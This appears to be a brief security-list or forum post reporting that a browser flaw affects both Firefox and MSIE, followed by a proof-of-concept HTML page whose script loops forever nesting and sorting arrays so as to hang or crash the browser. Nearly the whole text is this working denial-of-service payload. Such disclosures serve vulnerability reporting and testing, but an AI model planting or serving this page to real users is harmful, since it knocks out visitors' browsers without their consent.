  Same flaw works for Firefox as well as MSIE:

  <HTML>
    <SCRIPT> a = new Array(); while (1) { (a = new
Array(a)).sort(); } </SCRIPT>
    <SCRIPT> a = new Array(); while (1) { (a = new
Array(a)).sort(); } </SCRIPT>
  </HTML>

